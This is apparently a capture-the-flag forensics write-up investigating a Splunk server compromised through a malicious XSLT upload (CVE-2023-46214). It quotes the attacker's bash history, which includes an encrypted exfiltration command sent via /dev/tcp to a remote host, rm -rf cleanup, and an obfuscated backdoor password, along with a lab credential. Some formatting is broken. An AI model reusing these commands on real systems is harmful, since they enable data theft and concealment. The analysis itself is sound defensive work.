### Scenario
In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?

### Tools
+ Wireshark - PCAP Analysis

### Forensic Analysis
After acquiring the artifacts, I analyzed the PCAP file using Wireshark and exported the HTTP Objects. I found several suspicious requests two of them stands out the most.

The attacker uploaded a malicious `XSLT` file to the Splunk Server.
```ad-tip
XSLT (eXtensible Stylesheet Language Transformations) is the recommended style sheet language for XML. XSLT is far more sophisticated than CSS. With XSLT you can add/remove elements and attributes to or from the output file.
```

![[Pasted image 20240615092924.png]]

The file contained the following payload inside it.

**search.xsl**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">

```

Then the TA used Splunks SPL Query Language to execute the payload.
![[Pasted image 20240615093453.png]]

Apparently, the TA exploited [CVE-2023-46214](https://www.cvedetails.com/cve/CVE-2023-46214/) to compromise the Splunk Server. According to [NIST](https://nvd.nist.gov/vuln/detail/CVE-2023-46214): *In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.*

The Splunk Server version was `9.0.5`. We can confirm this by the following data.
![[Pasted image 20240615094425.png]]

It's an authenticated remote code execution vulnerability, and the TA used the following credential to log into the Splunk Admin Panel.
```text
username=johnnyC
password=h3Re15j0hnNy
```

Some how the credential was stolen by the TA.

To search for the default time that was before and the default time that was set after, I took a look inside the `/var/log` directory. And I found two files that seemed archived log.

We were also able to find the previous Timezone that was set to `PDT`. Using [Epoch Converter](https://www.epochconverter.com/timezones) I was able to find the `PDT` timezone's offset which were `-07`

Next up we need to calculate the dwell time for `nginx` user creation to SSH logout session.

Apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx
```

The `useradd` command was issued on  `Apr 14 08:00:13` and the session for nginx user was closed on `Apr 14 08:03:08`. I used the [[Time]] resource's Add Subtract Time website to calculate the time difference. It was 2 minutes and 55 seconds.

Then to find the password of the `nginx` I copied the following snippet from the malicious XSLT file.
```bash
$ access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev);echo "nginx:$access";     
nginx:f8287ec2-3f9a-4a39-9076-36546ebb6a93
```
The password for the `nginx` user is stored inside the `$access` variable.

Task 7 was really hard for me. I first read the attacker `.bash_history` file and fond the following commands the TA ran.
```bash
whoami
cd /opt/splunk/bin/scripts/
ls
sudo rm -rf search.sh 
ls
sudo su
ls
cd /home/johnnycage/
tree
cd ~
ls
sudo mv /home/johnnycage/Documents/Important.pdf .
ls
zip data.zip *
ls
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
sudo rm -rf *
ls
exit
```

At a first glance it's a clever trick to hide the used key and iv for the AES-256-CBC algorithm used to encrypt the exfiltrated file. There's a lot of randomness to both the key and iv.

But examining the `auth.log` we found the plain command that was ran by the `nginx` user.

```text
$ cat auth.log | grep -i .zip               
Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
```

We found the Key and the IV for the data.zip file. But, unfortunately the TA deleted the files both `data.zip` and `Important.pdf`. I scoured the whole OS directories and files to find the file but to my ignorance I completely ignored the `capture.pcapng` file.

So, I opened up Wireshark again and searched for the port `8080`.
![[Pasted image 20240615181116.png]]

I followed the TCP stream and exported the data in `ASCII` format.
![[Pasted image 20240615181240.png]]

But, I couldn't decrypt the `data.zip`. Something was not right as I completely ignored another hint from the commands ran by the TA. Before, exfiltrating the data the did some encoding to the data.zip file. 
```bash
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
```

They first converted the encrypted data.zip file to `base64` and then used `dd conv=ebcdic` to convert the codec from `ASCII` to `EBCDIC`. 

This time I exported the whole TCP stream in `EBCDIC` which reversed the `EBCDIC` conversion back to `ASCII`.
![[Pasted image 20240615181906.png]]
We can see the content is now in `base64` when I selected show data as `EBCDIC`.

Then, decoded the `base64` back to encrypted `data.zip`
```bash
$ base64 -di data > data.zip
```

Now we got the encrypted data.zip file. We can now successfully try to decrypt it.
```bash
$ openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip -out data_dec.zip

$ unzip data_dec.zip
Archive:  data_dec.zip
  inflating: Important.pdf
```

Found, the `Important.pdf`. And found the answer to Task 7.
![[Pasted image 20240615182506.png]]

For the Task 8, we can easily find the credential using Wireshark.
![[Pasted image 20240615182843.png]]

### Summary
In this Sherlock, the TA exploited the Splunk Server to run a malicious bash script embedded in XSLT file. The bash script contained a persistence mechanism to add a new user onto the system and to the sudo group. The TA also injected a public key to the newly created user `nginx`'s `.ssh/authorized_keys` to access the backdoor account. After that the TA logged in as `nginx` and elevated their privileges to `root` using `su`. Then the TA moved an important file from `johnycage`'s `Documents` directory and encrypted the file and exfiltrated the file to his own C2 server `192.168.222.130:8080`.
